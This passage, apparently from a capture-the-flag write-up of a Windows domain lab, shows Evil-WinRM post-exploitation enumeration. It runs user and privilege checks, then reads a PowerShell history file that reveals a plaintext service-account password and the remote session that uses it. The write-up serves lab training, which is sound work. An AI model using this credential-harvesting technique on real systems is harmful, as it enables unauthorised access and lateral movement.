@@ -459,3 +459,77 @@ Info: Establishing connection to remote endpoint
 # Privilege Escalation
 ## Enumeration
 
+### Check legacy
+```
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> net user legacyy
+User name                    legacyy
+Full Name                    Legacyy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/23/2021 11:17:10 AM
+Password expires             Never
+Password changeable          10/24/2021 11:17:10 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2/17/2023 8:20:25 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *Development
+The command completed successfully.
+```
+
+### priv
+```
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+```
+
+### powershell history
+
+```
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\windows\powershell\psreadline> ls
+
+
+    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\windows\powershell\psreadline
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\legacyy\AppData\Roaming\Microsoft\windows\powershell\psreadline> type ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+```
+
+## 
